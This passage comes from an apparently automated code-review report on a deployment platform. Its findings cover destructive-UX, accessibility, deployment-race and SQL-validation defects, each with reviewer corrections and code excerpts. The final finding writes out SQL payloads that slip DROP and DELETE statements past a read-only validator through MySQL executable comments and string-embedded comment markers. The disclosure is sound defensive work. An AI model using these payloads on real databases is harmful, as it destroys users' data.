4. The redirect escape hatch is not taken. page.tsx:118-121 does a full `window.location.href = data.url` when the checkout response carries `url` — that would remount everything. But src/app/api/billing/checkout/route.ts never returns `url`; it returns only `{orderId, amount, currency, keyId}` on both the mock and live paths, so execution always falls through to the Razorpay modal + JS handler. The Razorpay options built at page.tsx:128-168 set no `callback_url` and no `redirect`, so there is no full-page navigation.

5. A refetch would in fact fix it, which confirms the data — not the backend — is the stale part. src/app/api/billing/verify/route.ts persists synchronously (`await updateUser(session.user.id, { subscription: updatedSubscription })`) and even re-mints the session cookie. src/app/api/billing/usage/route.ts reads `getUserById` → `getTier(user.subscript

</details>

### 🟠 HIGH — "Purge All Orphans" irreversibly deletes GCP databases chosen by a substring heuristic, behind a native confirm() that never names them, from a button styled identically to "Clear"
`product-ux-6` · `src/components/StorageSection.tsx:688`

**Failure scenario.** A customer runs infra discovery against their own GCP project, which also hosts a long-lived Cloud SQL instance they named `acme-pr-analytics` (or any name containing `-pr-` or `-branch-`). It does not match any active Deployify branch pattern, so discovery flags it `isOrphaned`. The header shows "3 ORPHANED" and offers a 20px-tall ghost button reading "Purge All Orphans" immediately to the left of an identically sized, identically styled "Clear" button that merely hides the list. One misclick, one native browser confirm that says only "PURGE ALL 3 orphaned resources" without naming a single one, and the loop issues DELETE for each — permanently destroying a production Postgres instance the 

**Impact.** The most destructive action in the product has the weakest confirmation in the product. Deleting a *project* gets a styled modal; permanently destroying N of the customer's real cloud databases — including ones Deployify does not own and only guessed at by filename — gets a browser alert that lists nothing and a button that looks like "Clear". The blast radius is the customer's entire GCP project 

**Reviewer correction.** Accurate restatement: "Purge All Orphans" (src/components/StorageSection.tsx:688) lets a project owner/admin irreversibly delete Cloud SQL, Memorystore and Firestore resources selected by a `name.includes('-pr-') || name.includes('-branch-')` substring test, behind a native confirm() that states only a count and no names. The intended safety filter — excluding resources whose name contains an active branch pattern — is broken in both directions: preview slugs are `${slug}-pr-${n}` (src/lib/utils.ts:79) but patterns are `pr${n}` (src/app/api/gcp/discover/route.ts:43), and branch slugs use hyphens via slugify() while patterns use underscores, which GCP instance names cannot contain. The filter therefore never matches, so the ORPHANED badge does not mean "unused" and any customer-owned instance with `-pr-` or `-branch-` in its name is offered for bulk deletion. It is not an unprivileged-actor vulnerability: viewers are 403'd at both GET and DELETE, and members see the button but every DELETE 403s. It is a high-consequence destructive-UX defect for admins, made worse by the same file guarding 16 far less dangerous actions with a proper ConfirmationModal while these two GCP-deletion paths use raw window.confirm. Also note the button is not styled identically to "Clear" — it is red text, same size and row. Fixes: use ConfirmationModal with the resource names enumerated and a type-to-confirm, and repair the pattern comparison (normalize both sides through the same slug function) before trusting isOrphaned for any bulk operation. | The claim is accurate in mechanism and severity; two details need restating. (1) "styled identically to Clear" is an overstatement: both are adjacent `variant="ghost" size="sm"` h-5 text-[8px] uppercase buttons, but the purge button carries `text-[var(--error)] hover:bg-[var(--error)]/10` (red text) while Clear does not. The substance holds — a 20px-tall ghost button performing irreversible multi-database deletion sits immediately beside a benign state-clearing button of the same size, weight, and type — but it is color-differentiated, not identical. (2) "a confirm() that never names them" is true of the dialog itself (line 692 interpolates only `orphans.length`), but the orphaned resources are listed as individually ORPHANED-badged cards in the panel directly above, so the names have been on screen; the defect is that the final irreversible gate does not restate them.

The claim also understates the problem in one respect worth folding in: the destructive scope is not actually limited to the substring heuristic. The DELETE handler never re-checks `isOrphaned` or ephemerality server-side, and `gcpProjectId` is an unvalidated query param (checkProjectAccess validates only the Deployify project; no GCP-project allowlist exists in the repo), so the deletion is bounded only by what the platform service account can reach. Combined with `deletionProtectionEnabled: false` as the creation default, there is no layer — client, server, or cloud — that stops a mistaken purge. Severity stays high: it requires a privileged, deliberate, multi-step action rather than a remote attacker, but the outcome is unrecoverable destruction of production databases selected by a false-positive-prone name match.

**Verified code:**

```ts
src/components/StorageSection.tsx:688-692
    const handlePurgeOrphans = async () => {
        const orphans = discoveredResources.filter(r => r.isOrphaned);
        if (orphans.length === 0) return;

        if (!confirm(`Are you sure you want to PURGE ALL ${orphans.length} orphaned resources? This action is irreversible.`)) return;

src/components/StorageSection.tsx:1157-1168 (Purge vs Clear, adjacent, same geometry)
                                        {discoveredResources.some(r => r.isOrphaned) && (
                                            <Button
                                                variant="ghost"
                                                size="sm"
                                                onClick={handlePurgeOrphans}
                                                disabled={isReclaiming !== null}
                                                className="h-5 px-2 text-[8px] font-bold uppercase tracking-wider text-[var(--error)] hover:bg-[var(--error)]/10"
                                            >
                                               
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** The code says what the claim says it says, and the cited scenario reproduces exactly. But the reachability lens changes the framing, and one detail of the claim is overstated.

REACHABILITY (my lens). Call graph: /dashboard/[id]/storage (src/app/dashboard/[id]/storage/page.tsx:112) renders StorageSection -> handleDiscover (line 598) GETs /api/gcp/discover -> handlePurgeOrphans (line 688) fires one DELETE /api/gcp/discover per orphan -> route DELETE -> deleteInstance() in cloudsql.ts:841 / memorystore / firestore-admin deleteDatabase.

Both endpoints are gated. GET rejects role 'viewer' (route.ts:30-32). DELETE requires owner|admin (route.ts:88-90). So:
- anonymous: no (401 at getSession).
- viewer: no, 403 on both.
- member (non-admin): CAN reach the button — StorageSection has zero role gating (grep for role/isOwner/isAdmin/viewer in the file returns only unrelated IAM-string literals at 3314/3357), so a member sees "Purge All Orphans", clicks it, and every DELETE 403s into failCount. Noisy UI/permission mismatch, but non-destructive.
- owner/admin of their own project: fully reachable and destructive.

So this is NOT an unprivileged-actor exploit and not privilege escalation. It is a self-inflicted-destruction footgun for a legitimately privileged user acting on their own connected GCP project. The claim never asserted otherwise, and the actor in its scenario (a customer running discovery on their own project) is exactly the reachable path — so it is not refuted on reachability grounds.

SCENARIO VERIFIED. I ran the actual predicate. With activePatterns ['pr42','main']: 'acme-pr-analytics' -> ephemeral=true, ORPHANED=true. The claim's example holds verbatim.

STRONGER THAN CLAIMED — the safety guard is inert. The `!activeBranchPatterns.some(...)` check is supposed to spare resources still in use, but it can never match Deployify's own naming. Resource slugs are built by getProjectSlugForDeployment (src/lib/utils.ts:79) as `${slug}-pr-${n}`, while route.ts:43 builds active patterns as `pr${n}` — 'acme-pr-42'.includes('pr42') is false, so a live PR-42 resource is flagged ORPHANED. Branch case is worse: slugs use slugify() (hyphens, utils.ts:11-17) but patterns use .replace(/[^a-zA-Z0-9]/g,'_') (underscores) — 'feature/x' becomes 'feature_x', and GCP instance names cannot contain underscores, so a branch pattern can never match any discovered name. Net effect: the "is it still in use?" filter never fires, and the ORPHANED badge actively misinforms the admin. Honest caveat: I found no code that creates a discoverable Cloud SQL/Memorystore *in

</details>

### 🟠 HIGH — The entire product renders at 8px, including every page's <h1>, and status text uses colors at ~1.9:1 contrast
`product-ux-7` · `src/app/dashboard/page.tsx:202`

**Failure scenario.** A customer opens /dashboard at 100% browser zoom on a 1440p display. The page title, the project names, the deployment status badges, the commit messages, the build/install command labels on the settings page, the pricing-card features, and the invoice table headers all render at 8 CSS pixels in bold uppercase with widened letter-spacing — roughly half the size of the browser's own UI chrome and below what most adults can read without leaning in. On the fleet-health card the count of degraded connectors is 8px #eab308 on #ffffff at 1.92:1, which is effectively invisible; a customer with three slow database connectors cannot see the number that tells them so.

**Impact.** This is the first impression of every screen and it makes the product feel broken rather than dense. Practically, it blocks the WCAG 1.4.3 contrast criterion outright on the status system, so any enterprise or public-sector buyer running an accessibility review fails the product at the front door; and the 8px body copy pushes every user to permanent browser zoom, at which the fixed max-w-7xl layou

**Reviewer correction.** Directionally correct and the mitigation hunt came up empty, but two mechanism details in the claim are wrong and should be restated:

(1) The h1 sizing is responsive, so the claimed scenario is inaccurate. Every one of the 30 `<h1>` elements in the repo is `text-[8px] md:text-[10px]` — 30/30 carry the md: override. On the claim's own scenario (1440p desktop, 100% zoom, >=768px) each page title renders at **10px, not 8px**. The 8px h1 only occurs below the md breakpoint (mobile). The claim's headline overstates the desktop case.

(2) What *is* 8px everywhere, at all viewport widths, is the non-heading text: of 1209 `text-[8px]` occurrences across 79 .tsx files, only 51 have an `md:` override, so ~1158 render at 8 CSS px on desktop. This includes the shared `Badge` base class (`src/components/ui/badge.tsx:24`), so every deployment status badge, plan badge, and metadata label in the product is 8px bold uppercase with `tracking-wider`. The pricing-card eyebrow/description/CTA (`src/components/billing/PricingCard.tsx:38,46,50,57,63,82`) and the dashboard's own section labels (`src/app/dashboard/page.tsx:182,188,201`) confirm this. Note the settings page build/install command *labels* are `text-[10px]`, not 8px (`src/app/dashboard/[id]/settings/page.tsx:232,263`) — a minor inaccuracy in the claim's enumeration.

(3) The ~1.9:1 contrast figure is accurate but is **light-theme only**, which the finder did not qualify. Measured WCAG ratios for `--warning #eab308`: 1.92:1 on white, 1.80:1 on the 10%-alpha `--warning-bg` the Badge actually uses. `--success #22c55e`: 2.28:1 / 2.09:1. `--error`: 3.30:1 and `--info`: 3.28:1 also fail AA. In the dark theme those same tokens are 8.7–10.3:1 and pass comfortably. Since the root layout sets `defaultTheme="dark"`, a first-time visitor sees the passing palette; the failure surfaces for anyone on light theme, which is reachable both via `enableSystem` and via the explicit toggle in `src/components/DashboardSidebar.tsx:211`. Because the text is 8px (well under the 18.66px bold large-text threshold), the AA large-text exemption does not apply and 4.5:1 is required.

Restated: ~1158 non-responsive `text-[8px]` labels, badges and status strings render at 8 CSS px at every viewport including desktop, and in light theme the success/warning status colors sit at 1.80–2.28:1 against their own badge backgrounds. Page `<h1>`s are 10px on desktop and 8px on mobile. Severity stays high: product-wide legibility failure plus a WCAG 1.4.3 AA violation, but not critical — no data loss, no security impact, and the dark default masks the contrast half. | Directionally correct and reachable, but two mechanism details are wrong.

(1) H1 SIZE AT THE CITED VIEWPORT: The claim's failure scenario specifies "100% browser zoom on a 1440p display" and asserts the page title renders at 8 CSS pixels. The class is `text-[8px] md:text-[10px]`, so above the 768px `md` breakpoint the h1 actually renders at 10px, not 8px. On a 1440p desktop the h1 is 10px. The 8px h1 is the sub-768px (mobile) rendering. This does not rescue the finding — 1,126 of the 1,177 `text-[8px]` occurrences carry NO `md:` escalation and therefore render at a literal 8px at every viewport width, including all the specific elements the claim names (status badges, commit SHA, invoice table headers, build/install command labels, pricing features). But the headline scenario overstates the h1 by one breakpoint.

(2) CONTRAST IS THEME-CONDITIONAL, NOT UNIVERSAL: The ~1.9:1 figure is arithmetically exact — I recomputed `--warning` #eab308 on a white card at 1.92:1 (also success #22c55e at 2.28:1, info #3b82f6 at 3.68:1, error #ef4444 at 3.76:1, all below the 4.5:1 required for non-large text). However this applies only in LIGHT theme. src/app/layout.tsx sets `defaultTheme="dark"`, and against the dark card #111113 the same warning color is 9.83:1 and success is 8.28:1 — both passing. Light theme remains genuinely reachable by real users (the DashboardSidebar theme toggle at src/components/DashboardSidebar.tsx:38, plus `enableSystem` which adopts the OS light preference), so the WCAG 1.4.3 failure is real for a substantial share of users — but it is not the universal state the claim implies.

ACCURATE RESTATEMENT: Across 79 files, 1,177 hardcoded `text-[8px]` Tailwind arbitrary-value classes render literal 8px text with `font-bold uppercase tracking-wider`; 1,126 of them have no responsive escalation and are 8px at all widths. Every `<h1>` in the application shares the single string `text-[8px] md:text-[10px] font-bold tracking-tight` (8px mobile / 10px desktop) versus a 16px browser default. No global rescale exists to make these relative. Separately, in light theme the status colors used as small text fall to 1.92-3.76:1, failing WCAG 1.4.3. Severity remains high: unconditional, product-wide, and reachable pre-authentication.

**Verified code:**

```ts
src/app/dashboard/page.tsx:201-204 (the claimed location) —
  201  <span className="text-[8px] font-bold uppercase tracking-wider text-[var(--muted-foreground)]">Workspace Overview</span>
  202  <h1 className="text-[8px] md:text-[10px] font-bold tracking-tight">
  203      {activeTeam ? `${activeTeam.name} Projects` : 'Personal Projects'}
  204  </h1>
Note line 202 carries `md:text-[10px]`, so 10px on desktop; line 201 has no override and is 8px everywhere.

src/components/ui/badge.tsx:24 (the shared base class for every status badge) —
  'inline-flex items-center rounded-full border px-2.5 py-0.5 text-[8px] font-bold uppercase tracking-wider transition-colors focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2',
and its variants at lines 14-17 —
  success: 'border-transparent bg-[var(--success-bg)] text-[var(--success)] hover:opacity-80',
  warning: 'border-transparent bg-[var(--warning-bg)] text-[var(--warning)] hover:opacity-80',

src/app/globals.css:29-34 (light theme, :root) —
  --success: #22c55e;
  --success-bg: rgba(34, 197, 94, 0.1);
  --warning: #eab308;
  -
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** My lens was existing mitigation, so I went looking for anything that would rescale or override these values. Nothing exists.

- `src/app/globals.css` (all 416 lines read): no `@theme` block, no `html { font-size }`, no `zoom`, no `transform: scale`. The only four `font-size` declarations are inside `.btn`, `.input`, `.badge` and `.log-viewer`. I checked whether those legacy classes could be rescuing anything — `grep -rn 'className="badge\|className="btn\|className="input"' src --include='*.tsx'` returns **zero hits**. They are dead CSS; the real `Badge` component hardcodes Tailwind `text-[8px]` instead. So the one plausible mitigation in the file is inert.
- `src/app/layout.tsx`: no scale wrapper. In fact the root layout's own skip-to-content link is `text-[8px]` (line 45), which is evidence against any global compensation.
- `src/app/dashboard/layout.tsx`: plain flex shell, no transform/zoom.
- Tailwind v4 via `@tailwindcss/postcss`; there is no tailwind.config file and arbitrary values like `text-[8px]` compile to literal `font-size: 8px` regardless of any rem base, so a root font-size change could not have helped even if one existed.
- Test-level pin: no `playwright.config.*` anywhere outside node_modules, no axe/a11y/contrast test in `src`, `scripts`, or any test dir. The 159 unit tests are `tsx --test` over `src/**/*.test.ts` and none touch typography. Nothing pins safe behaviour.
- Framework default: none applies. This is authored CSS, not something Next.js or React normalizes.

Git history confirms this is deliberate and repeated rather than an accident, which is the opposite of a mitigation: commit c9c8fd1 "apply Session 203 typography size reduction pass for high-density aesthetic — Reduced text-[9px] to text-[8px]", preceded by 40e5c20 "perform extreme progressive scaling", plus checked-in shell scripts `update_typography.sh` / `fix-ui.sh` at the repo root that ran global sed replacements to shrink type.

I computed the contrast ratios myself with the WCAG relative-luminance formula rather than trusting the number, including alpha-compositing the 10% `--*-bg` tints over both `#ffffff` (light) and `#0a0a0b` (dark). That is what surfaced the one real qualification the finder missed: the failure is light-theme-only, and the app's declared default is dark. That narrows the blast radius but does not eliminate it, since light is user-selectable and `enableSystem` is on.

Verdict: the guard the lens asked me to find does not exist, so the claim is not refuted. I set refuted=false and corrected the h1/desktop mechanism, the settings-page 

</details>

### 🟠 HIGH — Every successful deployment — including PR previews and branch builds — overwrites project.productionUrl, so the public reverse proxy starts serving the preview build
`reliability-races-1` · `src/lib/deployment.ts:136`  _(reviewers changed severity: critical → **high**)_

**Failure scenario.** A contributor opens PR #42. src/app/api/webhooks/github/route.ts:562 computes `projectSlug = getProjectSlugForDeployment(project, deployment)` = `myapp-pr-42` and passes it to `pollBuildStatus(...)` (line 600-614). When the preview build succeeds, syncDeploymentStatus builds `serviceName = dfy-myapp-pr-42`, resolves its Cloud Run URL, and then executes `updateProject(projectId, { productionUrl: 'https://dfy-myapp-pr-42-....run.app' })`. The same happens for any non-default branch push (deploy/route.ts:120 sets type 'branch', slug becomes `myapp-feature-x`). src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:91-103 resolves the public site by reading `project.productionUrl` and proxies every re

**Impact.** Unreviewed preview/branch code is served to real end users through the project's public proxy URL, and analytics are attributed to the wrong origin. A PR from any collaborator silently replaces production.

**Reviewer correction.** Accurate as a defect, but reframe: this is an unconditional overwrite, not a race, and it is not anonymously exploitable. Every successful non-production build — PR preview (autoDeployPrs defaults true) and branch build, whether triggered by a signed GitHub webhook or a manual member-role deploy of a non-default branch — reaches src/lib/deployment.ts:136-138, which writes `productionUrl: effectiveUrl` with no `deployment.type` guard even though the same function checks `deployment.type === 'preview'` at line 171. Because src/proxy.ts:99-111 rewrites `<slug>.<domain>` to /api/v1/proxy/<slug>, which uses `project.productionUrl` as upstream (route.ts:91,101-103), the production hostname then serves the preview build from the production origin; and after PR close the preview service is deleted (webhooks/github/route.ts:246-253) while productionUrl still points at it, so production hard-fails until the next default-branch deploy. Additional reachability the report missed: /api/projects/[id]/route.ts:59, /api/projects/[id]/deployments/route.ts:55 and /deployments/[deployId]/logs/route.ts:42 all invoke syncDeploymentStatus with the preview slug and do not gate on role, so a 'viewer' loading the dashboard executes the clobber write. Attack surface is bounded to actors with repo write access or member+ role — fork PRs cannot reach it because cloudbuild.ts:505 clones the base repo and `git checkout`s a sha that is absent there — and the value self-repairs on the next production deploy. Correct fix: guard the write with `if (deployment.type === 'production')` (or write to a per-environment URL field). | The mechanism is exactly as claimed — the write at src/lib/deployment.ts:136-138 is unconditional for every successful build, and the public subdomain proxy reads that field — but the blast radius is narrower than "critical". Accurate restatement: "syncDeploymentStatus() writes project.productionUrl for every SUCCESS build regardless of deployment.type, so a PR-preview or non-default-branch build silently repoints the platform subdomain (slug.deployify.io, rewritten by src/proxy.ts:108 into /api/v1/proxy/[slug], which forwards to project.productionUrl) at the preview Cloud Run service — a build wired to `preview`-target env vars/secrets and, when DB branching is on, an ephemeral `pr_<n>` database. Two limits the finder did not account for: (1) custom domains are unaffected — src/app/api/projects/[id]/domains/route.ts:136-139 creates the Cloud Run domain mapping against `project.cloudRunServiceId || dfy-<project.slug>`, i.e. the production service, never productionUrl, so a project with a custom domain keeps serving production; (2) the corruption self-heals on the next default-branch (production) deploy, which rewrites productionUrl through the same line. The trigger also requires push access to a branch in the repo — src/lib/gcp/cloudbuild.ts:505 clones the base repo and does `git checkout <sha>`, which will not resolve a fork-only commit, so fork PRs generally fail before reaching the SUCCESS path. Net: silent production-integrity break for every project relying on the platform subdomain (arguably critical for those), no privilege escalation, no effect on custom-domain production traffic."

**Verified code:**

```ts
src/lib/deployment.ts (the unguarded write, and the type-aware block 34 lines later proving the guard was simply omitted):
  80:         if (status === 'SUCCESS') {
  81:             // Build succeeded - get the service URL
  82:             const serviceName = generateServiceName(projectSlug);
  83:             const serviceUrl = await getCloudRunServiceUrl(serviceName, projectRegion);
 126:             const effectiveUrl = serviceUrl || `https://${serviceName}-${projectNumber}.${region || config.gcp.region}.run.app`;
 133:             // Track deployment usage
 134:             await trackDeployment(projectId, buildDurationMs);
 136:             await updateProject(projectId, {
 137:                 productionUrl: effectiveUrl,
 138:             });
 170:             // Handle Database Branching/Cloning for Preview Environments
 171:             if (deployment.type === 'preview' && pullRequestNumber) {
 172:                 await updateProject(projectId, {}); // Just to get latest project state   <-- no-op, restores nothing

src/lib/utils.ts:76-84 (preview slug is a DIFFERENT Cloud
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I read src/lib/deployment.ts in full, both webhook handlers, all four callers of syncDeploymentStatus/pollBuildStatus, src/lib/utils.ts (getProjectSlugForDeployment, generateServiceName, shouldAutoDeploy), src/lib/db.ts (updateProject), src/middleware/rbac.ts, src/proxy.ts, and the public proxy route.

MECHANISM — CONFIRMED, and it is not a race, it is an unconditional overwrite.
syncDeploymentStatus takes projectSlug as a parameter and derives everything from it: line 82 `generateServiceName(projectSlug)`, line 83 resolves that service's Cloud Run URL, line 126 `effectiveUrl`. Then lines 136-138 write `productionUrl: effectiveUrl` with zero guard on deployment.type. That the function knows the type is proven 34 lines later at line 171 (`if (deployment.type === 'preview' && pullRequestNumber)`) — so the missing guard at 136 is an omission, not a design decision.

REACHABILITY — CONFIRMED via the default-on path, no attacker required.
- Projects are created with `autoDeployPrs: true` (src/app/api/projects/route.ts:214), and the webhook only bails on an explicit `=== false` (route.ts:515).
- PR opened/synchronize/reopened -> createDeployment({type:'preview', pullRequestNumber}) (route.ts:520-529) -> `getProjectSlugForDeployment(project, deployment)` returns `${slug}-pr-${n}` (utils.ts:76-84) -> passed as arg 3 to pollBuildStatus (route.ts:600-614) -> syncDeploymentStatus -> serviceName `dfy-myapp-pr-42` -> productionUrl overwritten. Exactly as claimed.
- Same for branch builds: handlePushEvent computes type 'branch' for any branch in `autodeployBranches` (utils.ts:110-117) and passes `${slug}-${branch}` to pollBuildStatus (route.ts:204-218).
- Same for manual deploys of a non-default branch via POST /api/projects/[id]/deploy (deploymentType = 'branch' at :115, slug at :172, pollBuildStatus at :212). That route rejects role 'viewer' (:43-48) but allows 'member'.
- Extra reachability the finder did not mention: three GET routes that DO admit a 'viewer' call syncDeploymentStatus themselves on any in-flight deployment — /api/projects/[id]/route.ts:59, /api/projects/[id]/deployments/route.ts:55, /api/projects/[id]/deployments/[deployId]/logs/route.ts:42. checkProjectAccess (rbac.ts) returns allowed for any role, and none of those three re-check role. So a viewer merely loading the dashboard performs the productionUrl clobber write.

IMPACT — CONFIRMED, and worse than stated.
src/proxy.ts:99-111 rewrites `<slug>.<basedomain>/*` to `/api/v1/proxy/<slug>/*`, and that route reads `project.productionUrl` as the upstream (route.ts:91, 101-103). So the b

</details>

### 🟠 HIGH — No serialization or supersede-cancel between builds of the same project: an older commit's build can win the Cloud Run traffic race and the newer deployment records the wrong revision
`reliability-races-5` · `src/app/api/projects/[id]/deploy/route.ts:123`

**Failure scenario.** Two commits are pushed to main 30 s apart (or a user clicks Deploy twice). handlePushEvent (webhooks/github/route.ts:129-194) creates and submits build #1 for commit A, then build #2 for commit B; both target the identical service name `dfy-<slug>` (generateServiceName on the same production slug) and Cloud Build runs them in parallel. Build durations vary by minutes depending on Docker layer/GCS cache hits (cloudbuild.ts:216-221 restores a cache both builds share and both overwrite at gs://<bucket>/<projectSlug>.tgz). If build A finishes last, its `gcloud run deploy` + `update-traffic --to-latest` puts commit A's revision at 100%, so production serves the OLDER commit while the dashboard sh

**Impact.** Silent production regression — the platform reports the newest commit as live while serving an older one — plus corrupted deployment→revision mapping that makes rollback target the wrong build.

**Reviewer correction.** Directionally correct and reachable, but the primary mechanism is the traffic race, not the revision bookkeeping. Accurate restatement: Deployify creates and submits Cloud Build jobs for a project with no serialization, no supersede-cancel, and no active-build check (deploy/route.ts:123 and webhooks/github/route.ts:129 both call a plain createDeployment + submitCloudBuild). All production builds for one project target the same Cloud Run service `dfy-<slug>` and each ends with an unconditional `gcloud run deploy` + `update-traffic --to-latest` (cloudbuild.ts:373, 408-410). When two builds overlap — two pushes, a push during a manual deploy, or two Deploy clicks (the UI re-enables the button as soon as the POST returns, and the API has no guard at all) — the build that finishes LAST wins 100% of traffic irrespective of commit order, so an older commit can silently become production while the newer deployment row, ordered first by `createdAt desc`, is displayed as Ready/Live. Nothing reconciles this; it persists until the next deploy. Secondarily, because syncDeploymentStatus records `service.latestRevision` sampled at poll time rather than the revision its own build produced (deployment.ts:88-117), a poll landing after the other build's deploy step stamps a deployment with a different commit's revision — which then feeds the rollback (rollback/route.ts:44) and alias/traffic-tag (alias/route.ts:61,123) routes, so "rollback to commit B" can route traffic to commit A. Reachable by any non-viewer tenant or repo collaborator under NODE_ENV=production with K_SERVICE set; it is a reliability/correctness defect scoped to the tenant's own project, not an authorization bypass. | Directionally correct with no mitigation present, but the mechanism is sharper than "a race can record the wrong revision," and there are two distinct defects at one site rather than one.

(a) Deterministic mis-attribution, not just a race window: pollBuildStatus never learns the revision its own build created. On SUCCESS it calls getService(serviceName) and stores `service.latestRevision`, which cloudrun.ts:54 maps to the service's global `latestReadyRevision`. Because the build config uses no `--revision-suffix` and never captures the deploy step's output revision, any deployment that finishes while a sibling build's revision is already ready records the sibling's revision. That value is what the rollback API replays, so "roll back to commit A" can route 100% of production traffic to commit B's revision.

(b) Traffic winner is ready-ordering, not submit-ordering: `gcloud run deploy` routes 100% to its new revision by default and the follow-up step is `update-traffic --to-latest` (latest *ready* revision). The build whose revision becomes ready last wins, so a first-submitted older commit that builds slower serves production while the dashboard marks the newer deployment 'ready' and rewrites `project.productionUrl`. A third interleaving is that concurrent `gcloud run deploy` calls on the same service collide on Cloud Run's update lock and fail the second build, marking a healthy deployment 'error'.

Both submit paths are affected identically (deploy/route.ts:123-201 and webhooks/github/route.ts:129-215), and the fix has to cover both — a submit-time supersede-cancel plus binding each deployment to its own revision (e.g. `--revision-suffix` derived from the deployment id, and reading that name back instead of latestReadyRevision).

**Verified code:**

```ts
src/app/api/projects/[id]/deploy/route.ts:44-49 (only role gate; any non-viewer proceeds)
    if (access.role === 'viewer') {
        return NextResponse.json(
            { error: 'Forbidden: Viewers cannot trigger deployments' },
            { status: 403, headers: securityHeaders }
        );
    }

src/app/api/projects/[id]/deploy/route.ts:123-131 (cited line — unconditional create, no active-build check)
    const deployment = await createDeployment({
        projectId: project.id,
        type: deploymentType,
        status: 'queued',
        gitBranch: branch,
        gitCommitSha: commitSha,
        ...
    });

src/lib/utils.ts:53-57, 82-84 (both production builds collapse to the same service name)
    export function generateServiceName(resourceSlug: string): string {
        const baseName = resourceSlug.substring(0, 59);
        return `dfy-${baseName}`.replace(/-+$/, '');
    }
    ...
    } else if (deployment.type === 'production') {
        result = project.slug;
    }

src/lib/gcp/cloudbuild.ts:371-375, 402-411 (last finisher takes 100% of traffic)
                '
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I read the cited route, both webhook handlers, the build-config generator, the poller, and the DB layer. Every load-bearing element of the claim checks out, and there is no mitigation anywhere.

REACHABILITY (my lens) — fully reachable, no implausible precondition:
1. `POST /api/projects/[id]/deploy` needs only a valid `deployify_session` and `access.role !== 'viewer'` (route.ts:35-49). An ordinary signed-up tenant on their own project, or any 'developer'/'member' team role, passes. No admin, no dev-only env var.
2. The real-build branch is gated by `isRunningOnGCP()` = `process.env.K_SERVICE !== undefined || process.env.GOOGLE_CLOUD_PROJECT !== undefined` (src/lib/gcp/auth.ts:8-10). On Cloud Run K_SERVICE is always set, so production takes the Cloud Build branch. MOCK_DB is irrelevant to this path.
3. The code is live, not dead: the dashboard calls it via `redeployProject` (src/store/project-slice.ts:220-238), and the button's only guard is `isRedeploying`, which is cleared in the `finally` as soon as the 201 returns — i.e. seconds after submit, while the build is still running. A second click immediately creates a second concurrent build. The API itself has zero guard.
4. Second, non-UI path: `handlePushEvent` (webhooks/github/route.ts:129-218) does the same thing for every push that passes `shouldAutoDeploy`. Two pushes 30s apart, or one push landing during a manual deploy, produce the same overlap. Requires only repo push access.

MECHANISM — verified:
- Both concurrent production builds resolve to the identical Cloud Run service: `getProjectSlugForDeployment` returns `project.slug` unchanged for `type === 'production'` (utils.ts:82-84), and `generateServiceName` yields `dfy-<slug>` (utils.ts:53-57), used at cloudbuild.ts:92.
- The build ends with an unconditional `gcloud run deploy <serviceName> --image <sha-tagged image>` (cloudbuild.ts:373) followed by `gcloud run services update-traffic <serviceName> --to-latest` (cloudbuild.ts:408-410), with the comment "Route 100% traffic to the latest revision". Whichever build's deploy step finishes LAST takes 100% of traffic, regardless of commit recency. Build wall-clock varies by minutes (GCS cache hit/miss, migration steps, Cloud Build queueing), so the older commit routinely can finish last.
- No serialization or supersede anywhere: `submitCloudBuild` is a bare `builds.create` POST (cloudbuild.ts:544-586) with `options: { logging, machineType }` only — no worker-pool concurrency limit; `createDeployment` is a plain `doc(id).set()` with no transaction and no active-build check (db.ts:1147-11

</details>

### 🟠 HIGH — Data Lab SQL read-only enforcement bypassed via MySQL executable comments and comment-stripping empty-statement trick → arbitrary DDL/DML
`secrets-crypto-2` · `src/app/api/projects/[id]/storage/[storageId]/query/route.ts:138` · reported by 3 independent dimensions

**Failure scenario.** The validator strips /* ... */ comments to build `cleanQuery`, but the ORIGINAL `query` is what is sent to MySQL (connection.query(query), multipleStatements:true at line 650). MySQL executes the contents of `/*! ... */` version-comments. Payload: `/*!40000 DROP TABLE users */` — the comment strip makes cleanQuery empty, so `statements` is [] and the for-loop performs ZERO checks (no forbidden-keyword test, no allowed-prefix test), the request passes, and MySQL executes `DROP TABLE users`. Variant with a leading benign statement: `SELECT 1;/*!40000 DELETE FROM accounts */` → validator sees only `SELECT 1`, MySQL runs the DELETE. This defeats the 'Only read-only queries are allowed' guarantee

**Impact.** Complete bypass of the advertised read-only guard on the customer's MySQL/PlanetScale connector: arbitrary DROP/DELETE/UPDATE/INSERT, including by users holding the 'viewer' role who are denied write access on every other storage endpoint.

**Reviewer correction.** Directionally correct and the cited mechanism is real, but two details need fixing — one narrowing, one widening.

NARROWING: this is not anonymously reachable. The widgetId branch overwrites the caller's `query` with the stored widget query at line 50 before the gate runs, so an unauthenticated visitor cannot inject. The accurate actor is any authenticated member of the project — including `viewer`, the lowest role, which src/middleware/rbac.ts:20 admits and which this route never checks (line 943 uses the role only to mask output). That still crosses a boundary the codebase enforces everywhere else: storage/route.ts, rotate, ingest, apply-index, cutover, audit, clone, export and import all reject viewers, so a viewer cannot even add an index — yet can DROP a table here. Secondary persistence: storage/dashboards POST has no viewer check either, so a member can save a poisoned `isPublic: true` widget whose payload then executes on every anonymous view of /share/dashboard/[id].

WIDENING: the flaw is not MySQL-specific. Postgres ignores `/*! */`, so the finder's exact payload fails there, but node-pg's `requiresPreparation()` returns false for an empty `values` array (pg/lib/query.js:57), dropping `client.query(query, [])` at line 563 to the SIMPLE query protocol, which allows multiple statements. Combined with the same validate-a-copy/execute-the-original defect, `SELECT '--'; DROP TABLE users` yields `cleanQuery === "SELECT '"`, passes the gate, and executes both statements on Postgres — verified by running the validator. `SELECT '#'; DROP TABLE users` is the MySQL analogue. So the root cause is broader than "MySQL executable comments": the gate strips comment markers that appear inside string literals, which both erases whole statements and destroys the semicolon boundaries the splitter at line 149 depends on. Any fix that only special-cases `/*!` will leave the literal-embedded `--` and `#` variants exploitable.

Also worth noting for the fix: line 179 makes `isReadOnlyQuery` false for all of these payloads, so they bypass replica routing and land on the writable primary — the bypass hits exactly the connection where DDL succeeds.

